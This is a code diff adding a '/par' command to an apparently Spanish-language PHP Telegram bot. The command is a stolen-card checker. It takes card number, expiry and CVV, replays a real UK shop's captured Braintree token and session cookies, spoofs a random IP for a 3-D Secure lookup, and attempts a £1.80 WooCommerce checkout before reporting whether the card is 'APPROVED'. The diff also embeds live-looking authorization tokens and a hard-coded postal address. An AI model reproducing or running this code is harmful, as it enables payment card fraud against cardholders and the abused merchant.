@@ -1480,6 +1480,327 @@ editMessage($chat_id,$respuesta,$id_text);
 
 
 
+
+elseif((strpos($message, "!par") === 0)||(strpos($message, "/par") === 0)||(strpos($message, ".par") === 0)){
+
+$lista = substr($message, 5);
+$i     = explode("|", $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano  = $i[2];
+$cvv   = $i[3];
+
+$bin = substr($lista, 0, 6);
+
+
+////
+$num = "$cc$mes$ano$cvv";
+//-----------------------------------------------------//
+$verify = substr($cc, 16, 1);
+if($verify != ""){
+$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+sendMessage($chat_id,$respuesta, $message_id);
+die();
+}
+
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+}else{
+$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .par cc|m|y|cvv\n";
+sendMessage($chat_id,$respuesta, $message_id);
+die();
+}
+
+
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+//----------------------------------------------------//
+
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$curl = curl_init('https://lookup.binlist.net/'.$bin.'');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+$result = curl_exec($curl);
+curl_close($curl);
+//---------------------------------------------//
+$bank = capture($result, '"bank": {"name": "', '"');
+$emoji = capture($result, '"emoji":"', '"');
+$alpha = strtoupper(capture($result, '"alpha2":"', '"'));
+$scheme = strtoupper(capture($result, '"scheme":"', '"'));
+$type = strtoupper(capture($result, '"type":"', '"'));
+$currency = capture($result, '"currency":"', '"');
+//---------------------------------------------//
+if (empty($bank)) {
+$bank = "Unavailable";
+}
+if (empty($emoji)) {
+$emoji = "Unavailable";
+}
+if (empty($alpha)) {
+$alpha = "Unavailable";
+}
+if (empty($scheme)) {
+$scheme = "Unavailable";
+}
+if (empty($type)) {
+$type = "Unavailable";
+}
+if (empty($currency)) {
+$currency = "Unavailable";
+}
+$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+$content = curl_exec($curl);
+curl_close($curl);
+$binna = json_decode($content,true);
+//---------------------------------------------//
+$level = $binna['category'];
+$brand = $binna['scheme'];
+$country = $binna['country']['name'];
+$type = $binna['type'];
+$bank = $binna['bank']['name'];
+$count = "".$country." - ".$alpha." ".$emoji."";
+if (empty($level)) {
+$level = "Unavailable";
+}
+if (empty($brand)) {
+$brand = "Unavailable";
+}
+if (empty($country)) {
+$country = "Unavailable";
+}
+if (empty($type)) {
+$type = "Unavailable";
+}
+if (empty($bank)) {
+$bank = "Unavailable";
+}
+if (empty($currency)) {
+$count = "Unavailable";
+}
+
+
+
+//$name = "Carlos";
+//$correo = "carlos45@gmail.com";
+//$phone = "9831876589";
+
+
+//Daca todos los Tokens//
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'Content-Type: application/json',
+    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
+    'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua-mobile: ?1',
+    'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU3NjExMTksImp0aSI6ImU1NTM0MDg5LThkMWMtNGU3Zi04NTk4LTA4MzBjNjk5OWYzZiIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.-BmbpaELnXoWwRYifIwao_DRuvtmlul_k3h8bS1h4pqPfGxrU4iSI9h8rHCUChgVOwzHqDrk0_Id1uuOdghDng',
+    'braintree-version: 2018-05-10',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://www.partyrama.co.uk',
+    'sec-fetch-site: cross-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
+    'referer: https://www.partyrama.co.uk/',
+    'priority: u=1, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$data = json_decode($response, true); // true convierte el JSON en un a>
+
+$cardinalAuthenticationJWT = $data['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT'];
+$googleAuthorization = $data['data']['clientConfiguration']['googlePay']['googleAuthorization'];
+
+$paypalClientId = $data['data']['clientConfiguration']['googlePay']['paypalClientId'];
+$clientId = $data['data']['clientConfiguration']['paypal']['clientId'];
+$braintreeClientId = $data['data']['clientConfiguration']['paypal']['braintreeClientId'];
+
+
+
+///Se intresa la targeta
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"EH6 4JL","streetAddress":"10/10 Hawthornvale"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'Content-Type: application/json',
+    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
+    'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua-mobile: ?1',
+    'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU3NjExMTksImp0aSI6ImU1NTM0MDg5LThkMWMtNGU3Zi04NTk4LTA4MzBjNjk5OWYzZiIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.-BmbpaELnXoWwRYifIwao_DRuvtmlul_k3h8bS1h4pqPfGxrU4iSI9h8rHCUChgVOwzHqDrk0_Id1uuOdghDng',
+    'braintree-version: 2018-05-10',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://assets.braintreegateway.com',
+    'sec-fetch-site: cross-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
+    'referer: https://assets.braintreegateway.com/',
+    'priority: u=1, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$bin = $json['data']['tokenizeCreditCard']['creditCard']['bin'];
+$token = $json['data']['tokenizeCreditCard']['token'];
+
+curl_close($curl);
+
+
+///GENERA EL NONCE/////
+//$ip = "138.84.45.137";
+$ip = mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255);
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api.braintreegateway.com/merchants/h9rc962wyvrr97jn/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"amount":"1.80","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"es-US","browserScreenHeight":851,"browserScreenWidth":393,"browserTimeZone":360,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"","shippingSurname":"'.$name.'","ipAddress":"'.$ip.'","billingLine1":"10/10 Hawthornvale","billingLine2":"","billingCity":"Edinburgh","billingState":"","billingPostalCode":"EH6 4JL","billingCountryCode":"GB","billingPhoneNumber":"'.$phone.'","billingGivenName":"","billingSurname":"'.$name.'","shippingLine1":"10/10 Hawthornvale","shippingLine2":"","shippingCity":"Edinburgh","shippingState":"","shippingPostalCode":"EH6 4JL","shippingCountryCode":"GB","email":"'.$correo.'"},"bin":"'.$bin.'","dfReferenceId":"0_8c3eb650-aa83-4ade-853a-1a11de9ec092","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":588,"issuerDeviceDataCollectionTimeElapsed":10502,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU3NjExMTksImp0aSI6ImU1NTM0MDg5LThkMWMtNGU3Zi04NTk4LTA4MzBjNjk5OWYzZiIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.-BmbpaELnXoWwRYifIwao_DRuvtmlul_k3h8bS1h4pqPfGxrU4iSI9h8rHCUChgVOwzHqDrk0_Id1uuOdghDng","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"www.partyrama.co.uk","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"}}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'Content-Type: application/json',
+    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-ch-ua-platform: "Android"',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://www.partyrama.co.uk',
+    'sec-fetch-site: cross-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
+    'referer: https://www.partyrama.co.uk/',
+    'priority: u=1, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$nonce = $json['paymentMethod']['nonce'];
+
+curl_close($curl);
+
+
+////EJECUTA LA SUSCRIPCION////
+$curl = curl_init();
+
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.partyrama.co.uk?wc-ajax=checkout',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => "wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.partyrama.co.uk%2Fballoon-in-a-box%2Fbirthday-balloon-in-a-box%2F&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.partyrama.co.uk%2Fballoon-in-a-box%2Fbirthday-message-balloon-in-a-box%2F&wc_order_attribution_session_start_time=2024-09-07+01%3A47%3A31&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F128.0.0.0+Mobile+Safari%2F537.36&ship_to_different_address=1&shipping_last_name=".$name."&shipping_phone=".$phone."&shipping_country=GB&shipping_address_1=10%2F10+Hawthornvale&shipping_address_2=&shipping_city=Edinburgh&shipping_postcode=EH6+4JL&order_comments=Casa+rosado&billing_last_name=".$name."&billing_phone=".$phone."&billing_country=GB&billing_address_1=10%2F10+Hawthornvale&billing_address_2=&billing_city=Edinburgh&billing_postcode=EH6+4JL&billing_email=".$correo."&account_password=&shipping_method%5B0%5D=partyrama_shipping%3Arate%3A14&payment_method=braintree_cc&braintree_cc_nonce_key=".$nonce."&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fh9rc962wyvrr97jn%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fh9rc962wyvrr97jn%22%7D%2C%22merchantId%22%3A%22h9rc962wyvrr97jn%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22GBP%22%2C%22merchantIdentifier%22%3A%22h9rc962wyvrr97jn%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22$cardinalAuthenticationJWT%22%7D%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Partyrama%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22$googleAuthorization%22%2C%22paypalClientId%22%3A%22$paypalClientId%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Partyrama%22%2C%22clientId%22%3A%22$clientId%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22$braintreeClientId%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22appartyramacouk%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=&braintree_applepay_nonce_key=&braintree_applepay_device_data=&woocommerce-process-checkout-nonce=36f3fa9339&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review",
+  CURLOPT_COOKIE => '__kla_id=eyJlbWFpbCI6Impvam95MTc5NzBAb2Jpc2ltcy5jb20ifQ==; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-07%2001%3A47%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fballoon-in-a-box%2Fbirthday-message-balloon-in-a-box%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fballoon-in-a-box%2Fbirthday-balloon-in-a-box%2F; sbjs_first_add=fd%3D2024-09-07%2001%3A47%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fballoon-in-a-box%2Fbirthday-message-balloon-in-a-box%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fballoon-in-a-box%2Fbirthday-balloon-in-a-box%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=51c3f1a7250fd13e17ab377317cac481; woocommerce_items_in_cart=1; woocommerce_cart_hash=ac4d09194b032e88b2a9ab61752ca600; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_a54457280b903c6696cf9a36e4d4d7%7C%7C1725847493%7C%7C1725843893%7C%7Cb82249674b520797bcee1b0787ab4f14; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
+    'sec-ch-ua-platform: "Android"',
+    'x-requested-with: XMLHttpRequest',
+    'sec-ch-ua-mobile: ?1',
+    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://www.partyrama.co.uk',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
+    'referer: https://www.partyrama.co.uk/checkout/',
+    'priority: u=1, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$data = json_decode($response, true);
+$mensaje_error = trim(strip_tags($data['messages']));
+//--------------------------------------------------
+$patron = "/Reason: (.*)/";
+preg_match($patron, $mensaje_error, $matches);
+$respo = $matches[1];
+//--------------------------------------------------
+curl_close($curl);
+
+
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+if (empty($respo)) {
+        $respo = $response;
+}
+
+// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = True;
+} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($result1, 'Pick up card - S') !== false) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = False;
+} else {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+    $live = False;
+}
+
+if ($live) {
+    //echo "$respuesta\n";
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    //echo "$respuesta\n";
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+
+}
+
+
+	
+
+	
+
 elseif((strpos($message, "!pa") === 0)||(strpos($message, "/pa") === 0)||(strpos($message, ".pa") === 0)){
 
 $lista = substr($message, 4);
